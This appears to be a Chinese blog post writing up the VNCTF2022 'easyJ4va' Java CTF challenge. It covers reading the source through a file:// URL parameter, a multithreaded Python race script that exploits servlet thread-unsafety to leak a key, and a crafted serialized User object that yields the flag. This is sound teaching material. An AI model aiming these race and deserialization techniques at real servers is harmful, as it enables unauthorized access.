@@ -1,0 +1,574 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>从CTF题了解Servlet的线程安全问题 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="从CTF题了解Servlet的线程安全问题 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+VNCTF2022_easyJ4va  源于前几天打的VNCTF，这题自己尝试做了一下午，感觉确实可以，就拿来复盘一下，比赛做一下午没做出来，这里直接拿他读出来的源码进行复现吧，如果有想学习的师傅可以加我公告里的qq来拿源码试着做一下..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              从CTF题了解Servlet的线程安全问题
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>VNCTF2022_easyJ4va  源于前几天打的VNCTF，这题自己尝试做了一下午，感觉确实可以，就拿来复盘一下，比赛做一下午没做出来，这里直接拿他读出来的源码进行复现吧，如果有想学习的师傅可以加我公告里的qq来拿源码试着做一下</p>
+<h1 id="正文">正文</h1>
+<h2 id="涉及知识点">涉及知识点</h2>
+<p>个人感觉其中获取key的过程涉及到Servlet的线程安全问题，这里具体可以看一下Y4师傅的文章，给出文章地址 <a href="https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">Servlet的线程安全问题</a>，获取flag的过程涉及到java-Transient关键字的问题，这里给出文章地址  <a href="https://blog.csdn.net/u010156024/article/details/48345257?utm_medium=distribute.wap_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-48345257.wap_agg_so&amp;utm_term=volatile%E5%BA%8F%E5%88%97%E5%8C%96">java-Transient关键字、Volatile关键字介绍和序列化、反序列化机制、单例类序列化</a></p>
+<p>然后接下来具体看题吧</p>
+<h2 id="复现过程">复现过程</h2>
+<p>打开环境，提示我们/file?,可以想到这里应该是让我们在/file路径下get传入一个参数，访问/file提示输入url，大概就是让我们访问/file?url=xxxx，这里有经验的师傅就大概可以猜到存在类似于SSRF或者读文件漏洞，这里直接上了file协议，读取出他的源码。这就一步带过了，因为太简单了。</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173846821.png" alt="image-20220411173846821" loading="lazy"></figure>
+<p>读出来源代码以后我们直接进行审计，这就是一个Servlet对象，具体来看一下</p>
+<pre><code class="language-java">//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package servlet;
+
+import entity.User;
+import java.io.IOException;
+import java.util.Base64;
+import java.util.Base64.Decoder;
+import javax.servlet.ServletException;
+import javax.servlet.ServletOutputStream;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import util.Secr3t;
+import util.SerAndDe;
+
+@WebServlet(
+    name = &quot;HelloServlet&quot;,
+    urlPatterns = {&quot;/evi1&quot;}
+)
+public class HelloWorldServlet extends HttpServlet {
+    private volatile String name = &quot;m4n_q1u_666&quot;;
+    private volatile String age = &quot;666&quot;;
+    private volatile String height = &quot;180&quot;;
+    User user;
+
+    public HelloWorldServlet() {
+    }
+
+    public void init() throws ServletException {
+        this.user = new User(this.name, this.age, this.height);
+    }
+
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String reqName = req.getParameter(&quot;name&quot;);
+        if (reqName != null) {
+            this.name = reqName;
+        }
+
+        if (Secr3t.check(this.name)) {
+            this.Response(resp, &quot;no vnctf2022!&quot;);
+        } else {
+            if (Secr3t.check(this.name)) {
+                this.Response(resp, &quot;The Key is &quot; + Secr3t.getKey());
+            }
+
+        }
+    }
+
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String key = req.getParameter(&quot;key&quot;);
+        String text = req.getParameter(&quot;base64&quot;);
+        if (Secr3t.getKey().equals(key) &amp;&amp; text != null) {
+            Decoder decoder = Base64.getDecoder();
+            byte[] textByte = decoder.decode(text);
+            User u = (User)SerAndDe.deserialize(textByte);
+            if (this.user.equals(u)) {
+                this.Response(resp, &quot;Deserialize…… Flag is &quot; + Secr3t.getFlag().toString());
+            }
+        } else {
+            this.Response(resp, &quot;KeyError&quot;);
+        }
+
+    }
+
+    private void Response(HttpServletResponse resp, String outStr) throws IOException {
+        ServletOutputStream out = resp.getOutputStream();
+        out.write(outStr.getBytes());
+        out.flush();
+        out.close();
+    }
+}
+
+</code></pre>
+<p>首先我们需要关注的是如何获取到Flag,因此我们可以看到在doPost()方法里面有这么一段代码</p>
+<pre><code>            if (this.user.equals(u)) {
+                this.Response(resp, &quot;Deserialize…… Flag is &quot; + Secr3t.getFlag().toString());
+            }
+</code></pre>
+<p>要想要得到flag，必须要user和u相等，继续往上看，u是经过SerAndDe.deserialize(textByte);以后进行强制类型转换的结果，然后继续往上，可以看到一个if判断，需要拿到flag必须要先进入判断，必须要让如下代码结果为true</p>
+<pre><code>Secr3t.getKey().equals(key) &amp;&amp; text != null
+</code></pre>
+<p>text是接收的一个base64参数，因此我们要让Secr3t.getKey()=key，下面给出Secr3t的源码，阅读了Secr3t的源码可以知道，我们需要先获取到一个key，key是要在HelloWorldServlet里的doGet()方法进行获取</p>
+<pre><code class="language-java">//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package util;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import org.apache.commons.lang3.RandomStringUtils;
+
+public class Secr3t {
+    private static final String Key = RandomStringUtils.randomAlphanumeric(32);
+    private static StringBuffer Flag;
+
+    private Secr3t() {
+    }
+
+    public static String getKey() {
+        return Key;
+    }
+
+    public static StringBuffer getFlag() {
+        Flag = new StringBuffer();
+        InputStream in = null;
+
+        try {
+            in = Runtime.getRuntime().exec(&quot;/readflag&quot;).getInputStream();
+        } catch (IOException var12) {
+            var12.printStackTrace();
+        }
+
+        BufferedReader read = new BufferedReader(new InputStreamReader(in));
+
+        try {
+            String line = null;
+
+            while((line = read.readLine()) != null) {
+                Flag.append(line + &quot;\n&quot;);
+            }
+        } catch (IOException var13) {
+            var13.printStackTrace();
+        } finally {
+            try {
+                in.close();
+                read.close();
+            } catch (IOException var11) {
+                var11.printStackTrace();
+                System.out.println(&quot;Secr3t : io exception!&quot;);
+            }
+
+        }
+
+        return Flag;
+    }
+
+    public static boolean check(String checkStr) {
+        return &quot;vnctf2022&quot;.equals(checkStr);
+    }
+}
+
+</code></pre>
+<p>获取key的主要代码如下:</p>
+<pre><code class="language-java">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String reqName = req.getParameter(&quot;name&quot;);
+        if (reqName != null) {
+            this.name = reqName;
+        }
+
+        if (Secr3t.check(this.name)) {
+            this.Response(resp, &quot;no vnctf2022!&quot;);
+        } else {
+            if (Secr3t.check(this.name)) {
+                this.Response(resp, &quot;The Key is &quot; + Secr3t.getKey());
+            }
+
+        }
+    }
+</code></pre>
+<p>这里需要传入一个name参数，但是这里比较奇怪，又要让你Secr3t.check(this.name)结果为false，又要在else里的Secr3t.check(this.name)结果为true，这就有意思了，正常来说确实不可能，但是看了Y4师傅的那篇文章后可以知道多个客户端一起访问时，得到的是同一个Servlet，这就会造成别人对实例变量的修改会影响另外一个客户端。所以这里要拿到key，只需要用多线程来写，让他在一个线程为真的时候，另外一个线程为假，给出python脚本</p>
+<pre><code class="language-python">import io
+import requests
+import threading
+
+url = 'http://1.13.163.248:8081/evi1?name='
+
+
+def white(session):
+    while event.isSet():
+        res = session.get(url=url+&quot;vnctf2022&quot;).text
+        if 'Key' in res:
+            print(res)
+            event.clear()
+
+
+def black(session):
+    while event.isSet():
+        res = session.get(url=url + &quot;vnctf2021&quot;).text
+        if 'Key' in res:
+            print(res)
+            event.clear()
+
+
+if __name__ == '__main__':
+    event = threading.Event()
+    event.set()
+    with requests.session() as session:
+        for i in range(1, 30):
+            threading.Thread(target=white, args=(session,)).start()
+
+        for i in range(1, 30):
+            threading.Thread(target=black, args=(session,)).start()
+</code></pre>
+<p>这里的话我当时跑出来的key是lDZHZ96itWAnjtaq9Xnqj2sfcn2SRqF1，图忘记保存了，这里拿到了key，接下来直接拿flag即可，获取flag的方法刚刚已经放出来了，就有个user可能不知道，user是类里面的一个User类的属性，User类如下</p>
+<pre><code class="language-java">//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package entity;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+
+public class User implements Serializable {
+    private String name;
+    private String age;
+    private transient String height;
+
+    public User(String name, String age, String height) {
+        this.name = name;
+        this.age = age;
+        this.height = height;
+    }
+
+    public String getName() {
+        return this.name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public String getAge() {
+        return this.age;
+    }
+
+    public void setAge(String age) {
+        this.age = age;
+    }
+
+    public String getHeight() {
+        return this.height;
+    }
+
+    public void setHeight(String height) {
+        this.height = height;
+    }
+
+    private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
+        s.defaultReadObject();
+        this.height = (String)s.readObject();
+    }
+
+    public boolean equals(Object obj) {
+        if (obj == null) {
+            return false;
+        } else if (this == obj) {
+            return true;
+        } else if (obj instanceof User) {
+            User user = (User)obj;
+            return user.getAge().equals(this.age) &amp;&amp; user.getHeight().equals(this.height) &amp;&amp; user.getName().equals(this.name);
+        } else {
+            return false;
+        }
+    }
+
+    public String toString() {
+        return &quot;User{name='&quot; + this.name + '\'' + &quot;, age='&quot; + this.age + '\'' + &quot;, height='&quot; + this.height + '\'' + '}';
+    }
+}
+
+</code></pre>
+<p>user会有初始值，我们需要让u=user，需要搞清楚u是怎么来的，再放一遍代码，是通过我们传入的base64的参数进行base64解码然后经过SerAndDe.deserialize方法之后强制转换成User类，这里的话我们大概可以知道这是个反序列化的函数，需要拿到他原始的值只需要序列化即可，这里题目自带了序列化的函数，我们只需要调用即可</p>
+<pre><code>        if (Secr3t.getKey().equals(key) &amp;&amp; text != null) {
+            Decoder decoder = Base64.getDecoder();
+            byte[] textByte = decoder.decode(text);
+            User u = (User)SerAndDe.deserialize(textByte);
+</code></pre>
+<p>给出SerAndDe的代码，其实这里影响不大，具体往下看</p>
+<pre><code class="language-java">//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package util;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+
+public class SerAndDe {
+    private SerAndDe() {
+    }
+
+    public static byte[] serialize(Object object) {
+        ObjectOutputStream oos = null;
+        ByteArrayOutputStream bos = null;
+
+        Object var4;
+        try {
+            bos = new ByteArrayOutputStream();
+            oos = new ObjectOutputStream(bos);
+            oos.writeObject(object);
+            byte[] b = bos.toByteArray();
+            byte[] var16 = b;
+            return var16;
+        } catch (IOException var14) {
+            System.out.println(&quot;serialize Exception:&quot; + var14.toString());
+            var4 = null;
+        } finally {
+            try {
+                if (oos != null) {
+                    oos.close();
+                }
+
+                if (bos != null) {
+                    bos.close();
+                }
+            } catch (IOException var13) {
+                System.out.println(&quot;io could not close:&quot; + var13.toString());
+            }
+
+        }
+
+        return (byte[])var4;
+    }
+
+    public static Object deserialize(byte[] bytes) {
+        ByteArrayInputStream bais = null;
+
+        Object var3;
+        try {
+            bais = new ByteArrayInputStream(bytes);
+            ObjectInputStream ois = new ObjectInputStream(bais);
+            var3 = ois.readObject();
+            return var3;
+        } catch (IOException | ClassNotFoundException var13) {
+            System.out.println(&quot;deserialize Exception:&quot; + var13.toString());
+            var3 = null;
+        } finally {
+            try {
+                if (bais != null) {
+                    bais.close();
+                }
+            } catch (IOException var12) {
+                System.out.println(&quot;LogManage Could not serialize:&quot; + var12.toString());
+            }
+
+        }
+
+        return var3;
+    }
+}
+
+</code></pre>
+<p>我开始的时候是直接调用序列化方法，然后base64编码，但是确实没用，后面还是别的师傅和我说，有一个属性不可序列化，其中这个height加入了transient关键字，使他不能进行序列化，这里我们就直接看我上面放出的那篇文章吧，具体方法就是重写一个writeObject方法，手动重新赋值一个可序列化的属性给对象</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173900975.png" alt="image-20220411173900975" loading="lazy"></figure>
+<p>手动在User类下面添加添加如下方法</p>
+<pre><code class="language-java">private void writeObject(ObjectOutputStream s) throws IOException{
+    s.defaultWriteObject();
+    s.writeObject(&quot;180&quot;);
+}
+</code></pre>
+<p>然后随便写个测试类，然后直接输出base64的结果，这里可以自己把环境运行起来</p>
+<pre><code>package VNCTF2022;
+import entity.User;
+import util.SerAndDe;
+import java.util.Base64;
+public class Test {
+    public static void main(String[] args) {
+        Base64.Decoder decoder = Base64.getDecoder();
+        User user = new User(&quot;m4n_q1u_666&quot;,&quot;666&quot;,&quot;180&quot;);
+        byte[] X= SerAndDe.serialize(user);
+        String text=Base64.getEncoder().encodeToString(X);
+        byte[] textByte=decoder.decode(text);
+        String Y = textByte.toString();
+        System.out.println(text);//base64
+
+        System.out.println(&quot;textByte: &quot;+textByte);//解base之后的 序列化结果
+        String out = SerAndDe.deserialize(textByte).toString();//反序列化结果
+        System.out.println(&quot;反序列化得到的结果为: &quot;+out);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173910411.png" alt="image-20220411173910411" loading="lazy"></figure>
+<p>即可得到我们所需要的结果，然后post传入即可，这里因为是自己搭建的环境，所以不能执行/readflag，这里只需要弹个计算器即可</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173905852.png" alt="image-20220411173905852" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E6%AD%A3%E6%96%87">正文</a>
+<ul>
+<li><a href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86%E7%82%B9">涉及知识点</a></li>
+<li><a href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B">复现过程</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/yuan-sheng-fan-xu-lie-hua-lian-jdk7u21/">
+              <h3 class="post-title">
+                原生反序列化链JDK7u21
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
